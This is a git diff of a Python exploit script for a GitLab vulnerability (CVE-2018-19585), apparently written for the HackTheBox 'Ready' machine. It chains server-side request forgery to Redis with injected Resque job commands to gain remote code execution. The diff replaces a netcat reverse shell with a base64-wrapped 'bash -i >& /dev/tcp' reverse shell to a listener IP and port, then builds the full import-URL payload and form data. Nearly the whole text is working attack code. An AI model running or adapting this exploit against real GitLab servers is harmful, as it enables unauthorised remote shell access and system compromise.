@@ -1,4 +1,5 @@
 import requests
+import base64
 import lxml.html
 from log_colors import *
 import random
@@ -19,7 +20,8 @@ class CVE2018_19585:
         self.rs_ip, self.rs_port = ip, port
         self.session = requests.Session()
         self.session.headers.update(self.headers)
-        self.name = "project_00{}".format(random.rand(1, 10000))
+        self.email = "kuku@ready.htb"
+        self.name = "project_00{}".format(random.randint(1, 10000))
 
     # get csrf token from page
     def get_csrf_token(self, url):
@@ -53,7 +55,7 @@ class CVE2018_19585:
             'new_user[password]' : self.password,
             self.csrf_param : self.csrf_token,
         }
-        r = self.session.post(url + '/users', data = data, allow_redirects = False)
+        r = self.session.post(self.url + '/users', data = data, allow_redirects = False)
         if r.status_code == 302:
             print (LogColors.GREEN + "successfully register new user :)" + LogColors.ENDC)
         else:
@@ -70,26 +72,22 @@ class CVE2018_19585:
             'user[password]' : self.password,
             self.csrf_param : self.csrf_token,
         }
-        r = self.session.post(url + '/users/sign_in', data = data, allow_redirects = False)
+        r = self.session.post(self.url + '/users/sign_in', data = data, allow_redirects = False)
         if r.status_code == 302 and r.text.find("redirected") > -1:
             print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)
         else:
+            print (r.text)
             print (LogColors.RED + "error logging in :(" + LogColors.ENDC)
+            sys.exit()
 
     # prepare payload with reverse shell
-    def prepare_revshell(self, token, namespace_id):
-        print (LogColors.BLUE + "create payload..." + LogColors.ENDC)
-        import_url = "git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git"
-        import_url = urllib.parse.quote_plus(import_url)
-        rev_shell = """\nmulti
-        sadd resque:gitlab:queues system_hook_push
-        lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|nc {} {} -e /bin/bash\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
-        exec
-        exec
-        exec\n""".format(self.rs_ip, self.rs_port)
-        token = urllib.parse.quote_plus(token)
-        payload = f"utf8=%E2%9C%93&authenticity_token={token}&project%5Bimport_url%5D={import_url}{rev_shell}&project%5Bci_cd_only%5D=false&project%5Bname%5D={self.name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={self.name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"
-        print (LogColors.YELLOW + "payload successfully created..." + LogColors.ENDC)
+    def prepare_payload(self):
+        print (LogColors.BLUE + "prepare payload with rev shell..." + LogColors.ENDC) 
+        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.rs_ip, self.rs_port)
+        #payload = "nc {} {} -e /bin/bash".format(self.rs_ip, self.rs_port)
+        wrapper = "echo {base64_payload} | base64 -d | /bin/bash"
+        base64_payload = base64.b64encode(payload.encode()).decode("utf-8")
+        payload = wrapper.format(base64_payload = base64_payload)
         return payload
 
     # exploitation (create new project)
@@ -102,8 +100,28 @@ class CVE2018_19585:
         namespace_input = tree.xpath(".//form[contains(@class, 'new_project')]//input[contains(@id,'project_namespace_id')]")
         if namespace_input:
             namespace = namespace_input[0].attrib["value"]
-        data = prepare_revshell(token, namespace)
-        
+        payload = self.prepare_payload()
+        template = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git
+        multi
+        sadd resque:gitlab:queues system_hook_push
+        lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{payload} \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
+        exec
+        exec
+        exec"""
+        payload = template.replace("{payload}", payload)
+        print (LogColors.YELLOW + "payload successfully created..." + LogColors.ENDC)
+
+        data = {
+            "authenticity_token": token, 
+            "project[import_url]": payload,
+            "project[ci_cd_only]": "false",
+            "project[name]": self.name,
+            "project[path]": self.name,
+            "project[visibility_level]": "0",
+            "project[namespace_id]" : namespace,
+            "project[description]": "hacked by cocomelonc :)"
+        }
+
         cookies = {
             'sidebar_collapsed': 'false',
             'event_filter': 'all',
